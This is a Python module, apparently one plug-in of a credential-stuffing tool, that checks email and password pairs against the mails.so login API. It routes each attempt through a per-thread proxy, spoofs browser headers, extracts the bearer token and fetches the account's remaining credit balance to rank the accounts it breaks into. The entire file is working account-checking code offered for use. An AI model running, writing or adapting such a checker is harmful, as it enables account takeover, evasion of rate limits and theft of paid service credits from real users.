"""
Checker for mails.so – with correct credits endpoint.
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://api.mails.so"
LOGIN_URL = BASE_URL + "/auth/login"
BILLING_URL = BASE_URL + "/client/billing/status?stripe=true"
TIMEOUT = 15

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mails.so",
        "Referer": "https://mails.so/login",
    })

    payload = {"email": email, "password": password}

    try:
        # 1. Login
        resp = session.post(LOGIN_URL, json=payload, timeout=TIMEOUT)
        try:
            data = resp.json()
        except ValueError:
            return False, f"Invalid JSON response: {resp.text[:100]}"

        # 2. Check login success
        if data.get("status") == "success" or data.get("message") == "Logged in":
            # Extract token if present
            token = None
            for key in ["token", "access_token", "jwt", "data.token", "data.access_token"]:
                parts = key.split(".")
                val = data
                for part in parts:
                    if isinstance(val, dict) and part in val:
                        val = val[part]
                    else:
                        val = None
                        break
                if val:
                    token = val
                    break
            if token:
                session.headers.update({"Authorization": f"Bearer {token}"})

            # 3. Fetch credits from billing endpoint
            try:
                bill_resp = session.get(BILLING_URL, timeout=TIMEOUT)
                if bill_resp.status_code == 200:
                    bill_data = bill_resp.json()
                    balance = bill_data.get("balance", {})
                    monthly = balance.get("remaining_monthly", 0)
                    extra = balance.get("remaining_extra", 0)
                    total = monthly + extra
                    return True, f"Login successful. Credits: {total} (monthly: {monthly}, extra: {extra})"
                else:
                    return True, f"Login successful (could not fetch credits: HTTP {bill_resp.status_code})"
            except Exception as e:
                return True, f"Login successful (could not fetch credits: {str(e)})"

        # 4. Check for error messages
        msg = data.get("message", "")
        if msg:
            if "invalid" in msg.lower() or "incorrect" in msg.lower():
                return False, f"Login failed: {msg}"
            return False, f"Login failed: {msg}"

        # 5. Fallback: if token exists, assume success
        if "token" in data or "user" in data:
            return True, "Login successful (token received)"

        return False, "Login failed – unknown reason"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"